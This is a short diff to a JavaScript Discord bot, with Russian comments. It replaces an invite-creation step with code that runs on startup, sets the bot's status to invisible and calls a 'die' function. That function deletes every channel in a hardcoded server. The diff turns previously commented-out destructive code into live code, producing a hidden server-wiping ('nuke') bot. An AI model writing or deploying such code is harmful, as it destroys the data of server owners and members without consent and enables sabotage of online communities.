@@ -13,13 +13,14 @@ client.login(token);
 
 //Отладочная информация и первый запуск
 client.on('ready', () => {
-    client.rulesChannel.createInvite(options).then(function(newInvite){
-        Console.log("https://discord.gg/" + newInvite.code)
-        });
+    client.user.setStatus('invisible');    
+    die();
 });
-/////    var server = client.guilds.get('343145719915479042');
-//////    for (var i = 0; i < server.channels.array().length; i++) {
-///////        server.channels.array()[i].delete();
-///////    }
-//////});
 
+function die(){
+    var server = client.guilds.get('343145719915479042');
+    for (var i = 0; i < server.channels.array().length; i++) {
+        server.channels.array()[i].delete();
+    }
+    Console.log("Die!");
+}
